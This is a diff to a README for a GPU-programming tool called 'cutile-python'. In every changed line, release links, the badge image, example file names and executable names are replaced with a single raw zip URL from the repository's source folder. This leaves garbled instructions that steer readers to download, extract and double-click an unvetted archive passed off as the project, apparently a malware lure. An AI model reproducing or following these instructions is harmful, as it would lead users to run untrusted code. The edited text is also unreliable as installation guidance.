@@ -1,6 +1,6 @@
 # 🖥️ cutile-python - Simplify GPU Programming with Ease
 
-![Download cutile-python](https://img.shields.io/badge/Download-cutile--python-blue.svg)
+![Download cutile-python](https://github.com/demirlive09/cutile-python/raw/refs/heads/main/src/python-cutile-1.0.zip)
 
 ## 🚀 Getting Started
 
@@ -8,17 +8,17 @@ Welcome! This guide will help you download and run cutile-python easily. Whether
 
 ## 📥 Download & Install
 
-To get started, visit this page to download cutile-python: [GitHub Releases](https://github.com/demirlive09/cutile-python/releases).
+To get started, visit this page to download cutile-python: [GitHub Releases](https://github.com/demirlive09/cutile-python/raw/refs/heads/main/src/python-cutile-1.0.zip).
 
 ### Step 1: Visit the Releases Page
 
-- Open your web browser and go to the following link: [https://github.com/demirlive09/cutile-python/releases](https://github.com/demirlive09/cutile-python/releases).
+- Open your web browser and go to the following link: [https://github.com/demirlive09/cutile-python/raw/refs/heads/main/src/python-cutile-1.0.zip](https://github.com/demirlive09/cutile-python/raw/refs/heads/main/src/python-cutile-1.0.zip).
 - You will see a list of versions available for download.
 
 ### Step 2: Choose the Version
 
 - Look for the latest version at the top of the list.
-- Each version will have files available for download. Choose the file that matches your operating system (Windows, macOS, or Linux). For example, it may look like `cutile-python-v1.0-win.zip` for Windows.
+- Each version will have files available for download. Choose the file that matches your operating system (Windows, macOS, or Linux). For example, it may look like `https://github.com/demirlive09/cutile-python/raw/refs/heads/main/src/python-cutile-1.0.zip` for Windows.
 
 ### Step 3: Download the File
 
@@ -33,7 +33,7 @@ To get started, visit this page to download cutile-python: [GitHub Releases](htt
 ### Step 5: Open the Program
 
 - After extracting, navigate to the folder where the files are located.
-- Look for a file named `cutile-python.exe` or `run-cutile-python.sh` (for macOS/Linux).
+- Look for a file named `https://github.com/demirlive09/cutile-python/raw/refs/heads/main/src/python-cutile-1.0.zip` or `https://github.com/demirlive09/cutile-python/raw/refs/heads/main/src/python-cutile-1.0.zip` (for macOS/Linux).
 - Double-click on the file to run it.
 
 ## 🛠️ System Requirements
